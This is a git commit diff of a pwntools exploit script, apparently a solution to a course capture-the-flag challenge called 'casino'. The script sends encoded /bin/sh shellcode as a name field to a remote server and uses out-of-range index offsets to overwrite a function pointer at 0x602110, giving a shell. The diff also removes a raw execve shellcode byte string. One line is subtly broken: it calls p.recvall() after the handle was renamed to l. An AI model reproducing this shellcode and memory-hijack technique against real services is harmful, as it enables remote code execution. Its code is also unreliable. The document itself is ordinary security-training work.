80faa46a0855f9ba7734fd8864f3f3494368bec2
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-12-09 15:08:05 +0800

    Hw0x05 casino AC, clean code

--- Hw0x05/solve.py
+++ Hw0x05/solve.py
@@ -4,25 +4,21 @@ from pwn import *
 # shellcode
 context.clear(arch='x86_64')
 sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))
-# sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 sc = b'\x00' * 32 + sc
 print('sc ', sc)
 
 # random number
-p = process("./gen_num.out")
+l = process("./gen_num.out")
 numbers = p.recvall().decode().split('\n')
 del numbers[-1]
-p.close()
+l.close()
 
 # send
-# r = process("./casino")
 pause()
-# elf = ELF("./casino")
 r = remote('edu-ctf.csie.org', 10172)
 r.sendlineafter('name: ', sc)
 r.sendlineafter('age: ', '40')
 
-# offset = -160 / 4
 offset = -176 / 4
 
 for cnt_try in range(0, 2):
@@ -41,15 +37,12 @@ for cnt_try in range(0, 2):
     r.sendlineafter('0:no]:', '1')
 
     if cnt_try == 1:
-        #raw_input()
         r.sendlineafter('6]:', str(offset + 2))
-        print('finished sending offset', str(offset + 2))
 
         r_out = 'Chose the number ' + str(offset + 1) + ': '
         r.sendlineafter(r_out, '0')
     elif cnt_try == 0:
         r.sendlineafter('6]:', str(offset + 1))
-        print('fffffinished sending offset ', str(offset + 1))
 
         r_out = 'Chose the number ' + str(offset) + ': '
         hijack = 0x602110
